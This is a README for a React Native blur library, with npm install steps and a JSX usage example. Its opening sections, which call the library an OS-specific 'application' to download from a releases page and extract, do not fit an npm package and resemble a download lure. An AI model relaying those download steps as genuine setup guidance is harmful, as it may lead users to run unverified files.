# 🎨 react-native-variable-blur - Create Stunning Blurs in Your App

[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/nifethecaveman/react-native-variable-blur/releases)

## 🚀 Getting Started

Welcome to **react-native-variable-blur**! This tool allows you to create beautiful variable, progressive, and gradient blurs in your React Native applications. This guide will help you download and run this software easily, even if you're not a programmer.

## 💾 Download & Install

To get started, visit the following link to download the application:

[Download from Releases Page](https://github.com/nifethecaveman/react-native-variable-blur/releases)

Once there, you will find different versions of the application. Choose the latest version for the best experience. Click on the file that suits your operating system, and the download will start automatically.

## 📥 System Requirements

Before downloading, ensure your system meets the following requirements:

- **Operating System**: Windows 10 or later, macOS 10.12 or later, or any modern Linux distribution.
- **React Native**: Ensure you have React Native set up in your project. The library requires React Native version 0.60 or greater.
- **Node.js**: This should be installed on your machine. You can get it from [nodejs.org](https://nodejs.org).

## ⚙️ Installation Steps

1. **Download the Package**: Follow the steps in the "Download & Install" section to get the latest version of **react-native-variable-blur**.
  
2. **Extract the Files**: Once the download finishes, locate the downloaded file in your Downloads folder. Extract the contents to a new folder on your computer.

3. **Open Your Project**: Launch the project you want to work on with your favorite code editor, such as Visual Studio Code or Atom.

4. **Install the Package**: Open your terminal or command prompt, navigate to your project directory, and run the following command:
   ```
   npm install react-native-variable-blur
   ```

5. **Link the Package**: After installation, you need to link the package to your project by running:
   ```
   react-native link react-native-variable-blur
   ```

6. **Clear Cache**: It may help to clear any cache to avoid issues. Run:
   ```
   npm start -- --reset-cache
   ```

7. **Rebuild Your Application**: Finally, rebuild your application with your development tools or run:
   ```
   react-native run-android
   ```
   or
   ```
   react-native run-ios
   ```

## 🌟 Usage

Once installed, you can use the variable blur effect in your components. Here’s a simple example of how to implement it:

```javascript
import React from 'react';
import { View, StyleSheet } from 'react-native';
import VariableBlur from 'react-native-variable-blur';

const App = () => {
  return (
    <View style={styles.container}>
      <VariableBlur
        blurType="light"
        blurAmount={10}
        style={styles.blurView}
      />
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
  blurView: {
    width: '100%',
    height: '100%',
  },
});

export default App;
```

This example demonstrates how to create a simple blurred background in your app. Adjust the `blurType` and `blurAmount` to achieve your desired effect.

## 🔧 Features

- **Variable Blur**: Easily set different blur levels dynamically.
- **Customizable**: Choose from light, dark, or custom gradients.
- **Performance Optimized**: The library is designed to use minimal resources.

## 🧑‍🤝‍🧑 Community Support

If you run into any issues or have questions, feel free to reach out in the [Issues](https://github.com/nifethecaveman/react-native-variable-blur/issues) section of the repository. We encourage users to share their experiences or improvements.

## 📄 License

This project is licensed under the MIT License. You can review the full license [here](https://github.com/nifethecaveman/react-native-variable-blur/blob/main/LICENSE).

## 🎉 Contributing

Contributions are welcome! Please submit your pull requests or suggestions on the [GitHub repo](https://github.com/nifethecaveman/react-native-variable-blur).